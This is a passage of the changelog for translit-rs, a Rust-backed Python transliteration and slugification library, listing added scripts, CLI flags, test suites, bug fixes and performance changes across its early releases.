    Build fails if any assertion is violated.
  - **Exhaustive domain tests** (Rust): 16 tests covering all 11,172 Hangul syllables,
    full BMP (63,488 codepoints) for ASCII output and idempotence, all 20,992 CJK
    ideographs, all 51 compatibility jamo, and structural verification of 15 Indic
    script blocks. Zero sampling gaps.
  - **Stated invariant specifications** (Python): 7 stated invariants
    (I1–I7) verified via exhaustive enumeration and Hypothesis — ASCII passthrough,
    ASCII output, idempotence, no exceptions, determinism, input size bound, output
    length bound.
- **Two-tier test architecture**: formal tests gated behind `#[ignore]` (Rust) and
  `@pytest.mark.formal` (Python) so they don't slow everyday development. Run before
  release with `cargo test -- --ignored` and `pytest -m formal`.
- **CLAUDE.md**: project-level development guide for automated agents — documents
  build commands, test tiers, and code conventions.
- `list_scripts()` function for programmatic script discovery.
- `docs/formal-verification.md`: specification document for exhaustive testing methodology.
- Comprehensive overhaul of `docs/architecture/testing-guarantees.md` with exhaustive
  testing differentiator analysis and alternative library comparison.

### Changed
- `IndicRole` enum and `indic_char_role()` / script-specific char_role functions
  changed from private to `pub` for integration test access (parent modules remain
  `#[doc(hidden)]`).
- `tables::hangul` module changed from `mod` to `pub mod` for integration test access.
- Hangul const assertions added: `JUNGSEONG_COUNT`, `JONGSEONG_COUNT`, total syllable
  count, and compatibility jamo range verified at compile time.
- Total test count: 2,900+ (up from 1,678 in 0.1.5).

## [0.1.5] — 2026-03-27

### Added
- **Reverse transliteration**: `transliterate(text, target="ru")` converts Latin → native
  script for Russian, Ukrainian, and Greek. PHF tables generated at build time from
  inverted language TSV data.
- **Toned pinyin**: `transliterate("北京", tones=True)` returns `"běi jīng"` with tone
  marks. Toned readings sourced from Unihan `kMandarin` field for all 20,924 CJK
  Unified Ideographs.
- **ISO 9:1995 scholarly Cyrillic**: `transliterate(text, strict_iso9=True)` for
  scholarly romanization. GOST R 7.0.34 variant via `gost7034=True`.
- **Japanese Kunrei-shiki** (`lang="ja-kunrei"`): alternative romanization profile,
  bringing total language count to 65.
- **Ancient scripts**: Coptic, Gothic, Old Italic, Runic, Ogham transliteration tables.
- **CLI short aliases**: `t` (transliterate), `s` (slugify), `n` (normalize),
  `p` (pipeline), `d` (demojize) — e.g. `translit t "café"`.
- **CLI `--target` flag**: `translit t --target ru "Moskva"` for reverse transliteration.
- **CLI `--tones`, `--strict-iso9`, `--gost7034` flags** for transliterate subcommand.
- **CLI `--lang` flag** for slugify subcommand.
- `console_scripts` entry point: `translit` command available after `pip install translit-rs`.
- `docs/cli.md`: comprehensive CLI documentation with piping, exit codes, examples.
- Links section in README.md and docs/index.md for RTD ↔ GitHub cross-references.

### Changed
- `transliterate()` API unified: `reverse_transliterate()` merged into `transliterate()`
  via `target` parameter. Old function removed.
- `transliterate_impl` Rust signature now takes 7 arguments (added `tones: bool`).
- Updated benchmark numbers after `tones` parameter addition (15–46% regression in
  transliteration hot path due to additional branch; throughput now 450M chars/sec
  Latin, 130M chars/sec Cyrillic).
- Performance documentation updated across 4 files to reflect current benchmark results.

### Fixed
- clippy `format_push_string` lint in `build.rs` — replaced `push_str(&format!())`
  with `write!()`.
- clippy `unreadable_literal` in PHF-generated `reverse_translit_phf.rs` — suppressed
  via inner attribute in `src/reverse.rs`.
- All 219 integration test call sites updated for 7-argument `transliterate_impl`.

## [0.1.4] — 2026-03-25

### Added
- **`lang="auto"` script-based language detection**: When `lang="auto"` is passed
  to `transliterate()`, `slugify()`, `TextPipeline`, `Slugifier`, or any other
  call site, the library detects the dominant non-Latin script in the input and
  maps it to a default language code automatically. Maps 28 scripts to language
  codes (e.g. Cyrillic→`ru`, Han→`zh`, Hiragana/Katakana→`ja`, Thai→`th`).
  Zero overhead for `lang=None` or explicit lang codes.
- `LANG_AUTO` constant (`"auto"`) in `translit._enums`.
- **Georgian transliteration** (`lang="ka"`): 114 TSV entries covering Mkhedruli,
  Mtavruli, and supplement ranges. BGN/PCGN national romanization.
- **Armenian transliteration** (`lang="hy"`): 86 TSV entries covering uppercase,
  lowercase, and 5 ligatures (U+FB13–FB17). BGN/PCGN romanization.
- **Sinhala transliteration** (`lang="si"`): 90 TSV entries. Extended Indic
  Brahmic engine range from `0x0900..=0x0D7F` to `0x0900..=0x0DFF` with
  dedicated `sinhala_char_role()` function for Sinhala-specific offsets.
- **Thai transliteration** (`lang="th"`): 87 TSV entries using RTGS romanization.
  New `ScriptClass::Tai` with tone-mark stripping and cancellation handling.
- **Lao transliteration** (`lang="lo"`): 67 TSV entries using BGN/PCGN
  romanization. Shares Tai engine with Thai via offset masking.
- **Ethiopic transliteration** (`lang="am"`): 307 TSV entries for Ge'ez
  alphasyllabary (34 consonant bases × 7 vowel orders + labialized forms +
  digits). Pure data addition — no engine changes needed.
- **Myanmar transliteration** (`lang="my"`): 89 TSV entries. New
  `myanmar_char_role()` for Brahmic engine with virama (U+1039) and asat
  (U+103A) support. Medials (U+103B–103E) classified as dependent vowels.
- **Khmer transliteration** (`lang="km"`): 110 TSV entries. New
  `khmer_char_role()` for Brahmic engine with coeng (U+17D2) as virama. All
  consonants normalized to inherent 'a' regardless of series.
- **Tibetan transliteration** (`lang="bo"`): 147 TSV entries. New
  `tibetan_char_role()` for Brahmic engine with halanta (U+0F84) and subjoined
  consonants (U+0F90–0FBC).
- Unicode range constants: `TIBETAN` (0x0F00–0x0FFF), `MYANMAR` (0x1000–0x109F),
  `KHMER` (0x1780–0x17FF) in `src/unicode_ranges.rs`.
- Comprehensive test coverage: example-based tests for all 9 new scripts,
  property-based tests (hypothesis + proptest), multi-script mixture tests.
- Built-in language count: 51 → 60.

### Changed
- `is_indic()` extended to include Tibetan, Myanmar, and Khmer ranges for
  Brahmic abugida processing.
- `indic_char_role()` dispatches to script-specific functions for Sinhala,
  Tibetan, Myanmar, and Khmer codepoint ranges.

## [0.1.3] — 2026-03-25

### Added
- `strip_control` and `strip_zero_width` now work as independent pipeline steps
  without requiring `collapse_whitespace=True`. Previously they were silently
  ignored when `collapse_whitespace` was disabled.
- `strip_control_chars()` and `strip_zero_width_chars()` standalone Rust
  functions for filtering without whitespace collapsing.
- `decimal` and `hexadecimal` flags in `SlugConfig` are now functional. Setting
  `decimal=False` preserves `&#NNN;` entities; `hexadecimal=False` preserves
  `&#xHHH;` entities. Previously these flags were accepted but silently ignored.
- Rust integration tests: `tests/integration_emoji.rs` (10 tests),
  `tests/integration_slugify.rs` (20 tests),
  `tests/integration_transliterate.rs` (21 tests),
  `tests/integration_whitespace.rs` (12 tests).

### Changed
- `TextPipeline` parameters `strip_control` and `strip_zero_width` changed from
  `bool` (default `True`) to `bool | None` (default `None`). When `None`, they
  inherit from `collapse_whitespace` — `True` if `collapse_whitespace=True`,
  `False` otherwise. Set explicitly to `True` for standalone use without
  `collapse_whitespace`. This is backward compatible: existing code that passes
  `collapse_whitespace=True` gets the same behavior as before.
- `steps()` now reports `strip_control` and `strip_zero_width` as separate
  entries when active, giving full visibility into pipeline behavior.
- Pipeline step order updated: `normalize → confusables → demojize →
  strip_accents → transliterate → fold_case → strip_control →
  strip_zero_width → collapse_whitespace`.
- Migrated from `once_cell` to `std::sync::LazyLock` / `OnceLock`; MSRV bumped
  to 1.80. Removed `once_cell` dependency.
- `needs_cjk_space()` match arm tightened from wildcard `_` to explicit
  `Ideograph | Hangul | Kana` to match the call-site `is_cjk` guard.

### Fixed
- `decode_entities()` corrupting multi-byte UTF-8 characters (BUG-1). The
  function used `bytes[i] as char` which treated each continuation byte as a
  separate Latin-1 codepoint (e.g. `café` → `cafÃ©`). Now advances by full
  UTF-8 characters.
- `decode_numeric_entity_skip()` panicking on malformed `&#` followed by
  multi-byte UTF-8 (BUG-2). The skip function walked through continuation
  bytes looking for `;`, landing inside a multi-byte character. Now stops at
  the first non-ASCII byte.

### Performance
- ASCII fast-path in `demojize_impl` and `demojize_rust`: pure-ASCII text
  returns immediately without `Vec<char>` allocation or emoji scanning.
- `filter_stopwords` replaced intermediate `Vec<_>` + `.join()` with a
  pre-allocated `String` fold, removing one allocation per slugify call.

## [0.1.2] — 2026-03-25

### Added
- Python 3.14 support (classifier and CI test matrix).
- `ruff check --fix` pre-commit hook for automatic lint fixing.
- CI publish workflow using `pypa/gh-action-pypi-publish` with OIDC trusted publishers.
- Multi-platform wheel builds: Linux (x86_64, aarch64), macOS (Intel, ARM64), Windows.
- `steps()` method on `_TextPipeline` type stub.

### Changed
- Resolved all clippy pedantic warnings instead of suppressing them — reduced
  lint suppressions from 48 to 22 (remaining are genuine PyO3 constraints).
  Fixes include: combined identical match arms, replaced manual counters with
  `.enumerate()`, moved item declarations before statements, used `clone_into()`,
  merged identical branches, fixed doc comment formatting.
- Widened `stopwords` and `replacements` type stubs from strict `tuple`/`list`
  to `Sequence` for better mypy compatibility.
- Applied `ruff format` to all Python source and test files.
- Switched docs publish from deprecated `maturin upload` to
  `pypa/gh-action-pypi-publish`.
- macOS Intel wheels now cross-compiled on ARM64 runner (macos-14) instead of
  deprecated macos-13.
- CI doctests now run against installed package (not source tree) with explicit
  `shell: bash` for Windows compatibility.

### Fixed
- `TextPipeline.explain()` doctest: output format is `normalize (NFC)` not
  `normalize (form=NFC)`.
- `from __future__ import annotations` placement in test files (must follow
  module docstring, not precede it).
- Malformed HTML entity test expectation: `decode_entities("&#xyz;")` correctly
  returns `""`, not `"yz;"`.
- Rust benchmark CI: target `bench_core` binary explicitly to avoid passing
  Criterion flags to the test harness.
- Ruff lint fixes: unsorted imports in `test_encoding.py`, unused import
  `is_mixed_script` in `test_security_invariants.py`.
- Read the Docs trigger workflow: simplified curl status handling, graceful
  warning when `RTD_TOKEN` is missing.
- Removed incorrect PyPy classifier (abi3 is CPython-only).

## [0.1.1] — 2026-03-25

### Added
- `src/unicode_ranges.rs` — named constants for all Unicode codepoint ranges used
  by the library, eliminating magic numbers scattered across modules.
- `tests/test_concurrency.py` — concurrent access tests for `LANG_TABLES` and
  `HANGUL_CACHE`, plus malformed Unicode input tests.
- Code coverage reporting in CI (`pytest-cov`, XML report uploaded as artifact).
- `CLOCK$`, `KEYBD$`, `SCREEN$`, `COM0`, `LPT0` added to Windows reserved filename list.
- `casefold()` alias for `fold_case()` — matches `str.casefold()` naming.
- `remove_accents()` alias for `strip_accents()` — matches sklearn/ML ecosystem naming.
- Compatibility parameter aliases: `replacement_text`/`max_len` on `sanitize_filename()`
  (pathvalidate), `greedy`/`preferred_aliases` on `is_confusable()` (confusable_homoglyphs),
  `delimiters` on `demojize()` (emoji library).
- Complete API documentation for 19 previously undocumented exported functions:
  precompiled pipelines, grapheme clusters, encoding detection, `Text` builder,
  `is_safe_hostname`, `demojize`, `strip_bidi`, `EmojiProvider` protocol.
- Three new API reference pages: Precompiled Pipelines, Grapheme Clusters, Encoding.
- "Guides by role" section in `docs/index.md` and `README.md`.
- Performance section in `README.md` with benchmark numbers.
- `Script` enum documentation expanded from 28 to all 41 members.

### Changed
- `transliterate_impl` refactored: capacity estimation extracted to `estimate_capacity()`,
  character classification to `classify_char()`, and CJK spacing logic to
  `needs_cjk_space()`.
- All `RwLock` accesses now recover from lock poisoning using
  `.unwrap_or_else(|e| e.into_inner())` instead of silently falling through.
- Lambda closures in `_compat.py` replaced with named inner functions for clarity.
- `emoji.rs` `write!()` call no longer uses `.unwrap()` (infallible, documented with
  a `// SAFETY` comment).
- MkDocs theme switched from `material` to `readthedocs`.
- All documentation references updated from "unirust" to "translit".
- Development status promoted from Alpha to Beta.
- Package renamed from `translit` to `translit-rs` on PyPI (interim until PEP 541
  grants the `translit` name). Python import remains `import translit`.

### Fixed
- Type stub `_text.pyi` imported from wrong module name (`unirust` → `translit`).
- Type stub `_translit.pyi` missing `min_confidence` parameter on `_decode_to_utf8`.
- Type stub `_text.pyi` missing `grapheme_split`, `grapheme_truncate`, `catalog_key` methods.
- `security_clean()` pipeline step order corrected in 5+ locations: strip_bidi runs
  before collapse_whitespace (matching Rust implementation).
- `catalog_key()` step order corrected: transliterate before strip_accents.
- Stale PyO3 boundary overhead corrected from ~4µs to ~240ns in docs and code comments.

### Deprecated
- `translit._compat` awesome-slugify compatibility layer (`Slugify`, `UniqueSlugify`,
  `slugify_*` instances) — planned removal in v1.0.

## [0.1.0] — 2026-01-01

### Added
- Initial release.
- Unicode transliteration for 60 language profiles.
- Slugification, normalization, confusable detection, filename sanitization.
- Emoji demojization with ZWJ sequence support.
- Backward-compatible layers for Unidecode and awesome-slugify.
